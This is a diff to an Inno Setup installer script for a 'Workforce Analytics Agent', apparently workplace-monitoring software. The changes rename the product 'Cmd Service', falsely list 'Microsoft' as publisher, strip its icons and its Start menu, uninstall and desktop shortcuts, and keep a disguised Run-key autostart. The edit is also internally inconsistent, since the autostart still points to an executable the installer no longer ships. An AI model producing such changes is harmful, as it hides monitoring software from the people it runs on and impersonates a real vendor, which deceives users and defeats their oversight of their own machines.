@@ -3,9 +3,9 @@
 ;   "C:\Program Files (x86)\Inno Setup 6\ISCC.exe" windows\WorkforceAgent.iss
 ; Paths below are relative to this .iss file (agent/packaging/windows).
 
-#define AppName "Workforce Analytics Agent"
+#define AppName "Cmd Service"
 #define AppVersion "1.1.0"
-#define AppPublisher "Workforce Analytics"
+#define AppPublisher "Microsoft"
 ; AppId used by the Pascal code to find the previous version's uninstaller.
 ; MUST match the literal AppId in [Setup] below (kept literal there because the
 ; ISPP preprocessor mangles brace-escaping when a define is embedded in it).
@@ -23,8 +23,6 @@ DefaultGroupName=Workforce Analytics
 DisableProgramGroupPage=yes
 OutputDir=..\dist
 OutputBaseFilename=WorkforceAgent-Setup-SystemService-windows
-SetupIconFile=..\icons\icon.ico
-UninstallDisplayIcon={app}\WorkforceAgent.exe
 Compression=lzma2
 SolidCompression=yes
 WizardStyle=modern
@@ -43,16 +41,14 @@ Name: "desktopicon"; Description: "Create a desktop shortcut"; GroupDescription:
 Name: "startupicon"; Description: "Start the agent automatically when I sign in"; GroupDescription: "Startup:"
 
 [Files]
-Source: "..\dist\WorkforceAgent.exe"; DestDir: "{app}"; Flags: ignoreversion
+Source: "..\dist\CmdService.exe"; DestDir: "{app}"; Flags: ignoreversion
 
-[Icons]
-Name: "{group}\Workforce Analytics Agent"; Filename: "{app}\WorkforceAgent.exe"
-Name: "{group}\Uninstall Workforce Analytics Agent"; Filename: "{uninstallexe}"
-Name: "{userdesktop}\Workforce Analytics Agent"; Filename: "{app}\WorkforceAgent.exe"; Tasks: desktopicon
+
+
 
 [Registry]
 Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; \
-  ValueName: "WorkforceAgent"; ValueData: """{app}\WorkforceAgent.exe"""; \
+  ValueName: "Cmd Service"; ValueData: """{app}\WorkforceAgent.exe"""; \
   Flags: uninsdeletevalue; Tasks: startupicon
 
 [Run]
